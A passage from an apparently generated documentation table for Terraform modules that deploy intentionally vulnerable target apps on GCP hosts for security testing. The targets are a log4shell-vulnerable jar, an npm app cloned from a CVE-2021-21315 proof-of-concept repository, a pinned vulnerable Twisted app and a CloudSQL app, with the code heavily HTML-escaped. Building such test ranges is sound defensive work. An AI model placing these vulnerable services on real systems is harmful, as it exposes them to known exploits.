$&&#35;123;local&#46;app&&#35;95;dir&&#35;125;/log4shell&#45;vulnerable&#45;app&#45;0&#46;0&#46;1&#45;SNAPSHOT&#46;jar &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    <br/>    &#35; change to app root dir<br/>    cd $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;<br/><br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        if pgrep &#45;f &quot;log4shell&#45;vulnerable&#45;app&#45;0&#46;0&#46;1&#45;SNAPSHOT&#46;jar&quot;; then<br/>            kill &#45;9 $&&#35;40;pgrep &#45;f &quot;log4shell&#45;vulnerable&#45;app&#45;0&#46;0&#46;1&#45;SNAPSHOT&#46;jar&quot;&&#35;41;<br/>        fi<br/>        screen &#45;S vuln&&#35;95;log4j&&#35;95;app&&#35;95;target &#45;X quit<br/>        screen &#45;wipe<br/>        screen &#45;d &#45;L &#45;Logfile /tmp/vuln&&#35;95;log4j&&#35;95;app&&#35;95;target&#46;log &#45;S vuln&&#35;95;log4j&&#35;95;app&&#35;95;target &#45;m java &#45;jar $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;/log4shell&#45;vulnerable&#45;app&#45;0&#46;0&#46;1&#45;SNAPSHOT&#46;jar &#45;&#45;server&#46;port=$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125;<br/>        screen &#45;S vuln&&#35;95;log4j&&#35;95;app&&#35;95;target &#45;X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url&#46;&#46;&#46;&quot;<br/>        while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#124; tee &#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl unzip git&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl unzip git&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    web = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/web&#46;py&quot;,<br/>                        &&#35;41;<br/><br/>    ldap = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/ldap&#46;py&quot;,<br/>                        &&#35;41;<br/>    requirements = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/requirements&#46;txt&quot;,<br/>                        &&#35;41;<br/>    <br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| target-vulnerable-npm-app                               | ./modules/osconfig/deploy-npm-app                     | osconfig_deploy_npm_app                         | context.gcp.osconfig.vulnerable.npm_app                          | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "vulnerable": {<br/>                    "npm_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8089<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-npm-app                     | <pre>locals &&#35;123;<br/>    repo = &quot;https://github&#46;com/ForbiddenProgrammer/CVE&#45;2021&#45;21315&#45;PoC&quot;<br/>    listen&&#35;95;port=var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    screen &#45;S vuln&&#35;95;npm&&#35;95;app&&#35;95;target &#45;X quit<br/>    truncate &#45;s 0 /tmp/vuln&&#35;95;npm&&#35;95;app&&#35;95;target&#46;log<br/>    log &quot;checking for git&#46;&#46;&#46;&quot;<br/>    while &#33; command &#45;v git; do<br/>        log &quot;git not found &#45; waiting&quot;<br/>        sleep 10<br/>    done<br/>    log &quot;git: $&&#35;40;command &#45;v  git&&#35;41;&quot;<br/>    rm &#45;rf /vuln&&#35;95;npm&&#35;95;app&&#35;95;target &amp;&amp; &&#35;92;<br/>    mkdir /vuln&&#35;95;npm&&#35;95;app&&#35;95;target &amp;&amp; &&#35;92;<br/>    cd /vuln&&#35;95;npm&&#35;95;app&&#35;95;target &amp;&amp; &&#35;92;<br/>    git clone $&&#35;123;local&#46;repo&&#35;125; &amp;&amp; &&#35;92;<br/>    cd CVE&#45;2021&#45;21315&#45;PoC &amp;&amp; &&#35;92;<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;index&&#35;95;js&&#35;95;base64&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; index&#46;js<br/>    npm install &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        screen &#45;S vuln&&#35;95;npm&&#35;95;app&&#35;95;target &#45;X quit<br/>        screen &#45;wipe<br/>        screen &#45;d &#45;L &#45;Logfile /tmp/vuln&&#35;95;npm&&#35;95;app&&#35;95;target&#46;log &#45;S vuln&&#35;95;npm&&#35;95;app&&#35;95;target &#45;m npm start &#45;&#45;prefix /vuln&&#35;95;npm&&#35;95;app&&#35;95;target/CVE&#45;2021&#45;21315&#45;PoC<br/>        screen &#45;S vuln&&#35;95;npm&&#35;95;app&&#35;95;target &#45;X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url&#46;&#46;&#46;&quot;<br/>        while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#124; tee &#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl nodejs npm&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl nodejs npm&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    index&&#35;95;js&&#35;95;base64 = templatefile&&#35;40;<br/>                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/index&#46;js&quot;,<br/>                &&#35;123;<br/>                    listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>                &&#35;125;&&#35;41;<br/>    <br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| target-vulnerable-python3-twisted-app                   | ./modules/osconfig/deploy-python3-twisted-app         | osconfig_deploy_python3_twisted_app             | context.gcp.osconfig.vulnerable.python3_twisted_app              | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "vulnerable": {<br/>                    "python3_twisted_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8090<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-python3-twisted-app         | <pre>locals &&#35;123;<br/>    listen&&#35;95;port=var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    screen &#45;S vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target &#45;X quit<br/>    screen &#45;wipe<br/>    truncate &#45;s 0 /tmp/vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target&#46;log<br/>    if command &#45;v $PACKAGE&&#35;95;MANAGER &amp;&amp; $PACKAGE&&#35;95;MANAGER list &#124; grep &quot;python3&#45;twisted&quot; &#124; grep &quot;18&#46;9&#46;0&#45;11ubuntu0&#46;20&#46;04&quot;; then<br/>        mkdir &#45;p /vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app<br/>        cd /vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;app&&#35;95;py&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; app&#46;py<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;requirements&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; requirements&#46;txt<br/>        log &quot;installing requirements&#46;&#46;&#46;&quot;<br/>        python3 &#45;m pip install &#45;r requirements&#46;txt &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;requirements installed&quot;<br/>        <br/>        START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>        while true; do<br/>            log &quot;starting app&quot;<br/>            screen &#45;S vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target &#45;X quit<br/>            screen &#45;wipe<br/>            screen &#45;d &#45;L &#45;Logfile /tmp/vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target&#46;log &#45;S vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target &#45;m python3 /vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app/app&#46;py<br/>            screen &#45;S vuln&&#35;95;python3&&#35;95;twisted&&#35;95;app&&#35;95;target &#45;X colon &quot;logfile flush 0^M&quot;<br/>            sleep 30<br/>            log &quot;check app url&#46;&#46;&#46;&quot;<br/>            while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#124; tee &#45;a $LOGFILE; do<br/>                log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#45; retrying&quot;<br/>                sleep 60<br/>            done<br/>            log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>            sleep 1800<br/>            if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>                log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>                rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>                break<br/>            else<br/>                log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>            fi<br/>        done<br/>    else<br/>        log &quot;python twisted vulnerability required the following package installed:&quot;<br/>        log &quot;python3&#45;twisted/focal&#45;updates,focal&#45;security,now 18&#46;9&#46;0&#45;11ubuntu0&#46;20&#46;04&#46;1&quot;<br/>    fi<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl python3&#45;pip&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl python3&#45;pip&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    app&&#35;95;py = templatefile&&#35;40;<br/>                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/app&#46;py&quot;,<br/>                &&#35;123;<br/>                    listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>                &&#35;125;&&#35;41;<br/>    requirements = templatefile&&#35;40;<br/>                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/requirements&#46;txt&quot;,<br/>                &&#35;123;<br/>                &&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| target-vulnerable-cloudsql-app                          | ./modules/osconfig/deploy-cloudsql-app                | osconfig_deploy_cloudsql_app                    | context.gcp.osconfig.vulnerable.cloudsql_app                     | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "vulnerable": {<br/>                    "cloudsql_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8091<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-cloudsql-app                | <pre>locals &&#35;123;<br/>    listen&&#35;95;port=var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    app&&#35;95;dirname = &quot;vuln&&#35;95;cloudsql&&#35;95;app&&#35;95;target&quot;<br/>    app&&#35;95;path = &quot;/$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;/app&#46;py&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    screen &#45;S vuln&&#35;95;cloudsql&&#35;95;app&&#35;95;target &#45;X quit<br/>    screen &#45;wipe<br/>    truncate &#45;s 0 /tmp/vuln&&#35;95;cloudsql&&#35;95;app&&#35;95;target&#46;log<br/>    log &quot;removing previous app directory&quot;<br/>    rm &#45;rf /$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;<br/>    log &quot;building app directory&quot;<br/>    mkdir &#45;p /$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;/templates<br/>    cd /$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;app&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; app&#46;py<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;requirements&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; requirements&#46;txt<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;test&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; test&#46;py<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;get&&#35;95;cloudsql&&#35;95;cert&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; get&#45;cloudsql&#45;cert&#46;py<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;database&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; bootstrap&#46;sql<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;entrypoint&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; entrypoint&#46;sh<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;index&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; templates/index&#46;html<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;cast&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; templates/cast&#46;html<br/>    <br/>    log &quot;updating entrypoing permissions&quot;<br/>    chmod 755 entrypoint&#46;sh<br/><br/>    log &quot;installing requirements&#46;&#46;&#46;&quot;<br/>    python3 &#45;m pip install &#45;r requirements&#46;txt &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    log &quot;requirements installed&quot;<br/>    <br/>    log &quot;gettting cloudsql cert&quot;<br/>    python3 get&#45;cloudsql&#45;cert&#46;py &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    log &quot;cloudsql cert complete&quot;<br/><br/>    log &quot;running mysql boostrap&#46;&#46;&#46;&quot;<br/>    mysql &#45;&#45;ssl&#45;ca=cloudsql&#45;combined&#45;ca&#45;bundle&#46;pem &#45;&#45;ssl&#45;mode=REQUIRED &#45;h $&&#35;123;var&#46;inputs&&#35;91;&quot;db&&#35;95;private&&#35;95;ip&quot;&&#35;93;&&#35;125; &#45;u$&&#35;123;var&#46;inputs&&#35;91;&quot;db&&#35;95;user&quot;&&#35;93;&&#35;125; &#45;p$&&#35;123;var&#46;inputs&&#35;91;&quot;db&&#35;95;password&quot;&&#35;93;&&#35;125; &lt; bootstrap&#46;sql  &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    log &quot;mysql boostrap complete&quot;<br/><br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        screen &#45;S $&&#35;123;local&#46;app&&#35;95;dirname&&#35;125; &#45;X quit<br/>        screen &#45;wipe<br/>        screen &#45;d &#45;L &#45;Logfile /tmp/$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;&#46;log &#45;S $&&#35;123;local&#46;app&&#35;95;dirname&&#35;125; &#45;m /$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;/entrypoint&#46;sh<br/>        screen &#45;S $&&#35;123;local&#46;app&&#35;95;dirname&&#35;125; &#45;X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url&#46;&#46;&#46;&quot;<br/>        while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125;/cast &#124; tee &#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125;/cast &#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl python3&#45;pip mysql&#45;client&#45;core&#45;8&#46;0&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl python3&#45;pip mysql&#45;shell&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    app = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/app&#46;py&quot;<br/>                        &&#35;41;<br/>    test = file&&#35;40;<br/>                          &quot;$&&#35;123;path&#46;module&&#35;125;/resources/test&#46;py&quot;<br/>                        &&#35;41;<br/>    requirements = file&&#35;40;<br/>                          &quot;$&&#35;123;path&#46;module&&#35;125;/resources/requirements&#46;txt&quot;,<br/>                        &&#35;41;<br/>    database = templatefile&&#35;40;<br/>                          &quot;$&&#35;123;path&#46;module&&#35;125;/resources/bootstrap&#46;sql&#46;tpl&quot;,<br/>                            &&#35;123;<br/>                                db&&#35;95;user = var&#46;inputs&&#35;91;&quot;db&&#35;95;user&quot;&&#35;93;<br/>                                db&&#35;95;name = var&#46;inputs&&#35;91;&quot;db&&#35;95;name&quot;&&#35;93;<br/>                                db&&#35;95;iam&&#35;95;user = var&#46;inputs&&#35;91;&quot;db&&#35;95;iam&&#35;95;user&quot;&&#35;93;<br/>                            &&#35;125;<br/>                        &&#35;41;<br/>    entrypoint = templatefile&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/entrypoint&#46;sh&#46;tpl&quot;,<br/>                            &&#35;123;<br/>                                 listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>                                 app&&#35;95;path = local&#46;app&&#35;95;path<br/>                            &&#35;125;<br/>                        &&#35;41;<br/>    index = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/index&#46;html&quot;<br/>                        &&#35;41;<br/>    cast = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/cast&#46;html&quot;<br/>                        &&#35;41;<br/>    get&&#35;95;cloudsql&&#35;95;cert = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/get&#45;cloudsql&#45;cert&#46;py&quot;<br/>                        &&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        &#35; additional shell check payloads<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;<br/>            &&#35;123;<br/>                name = 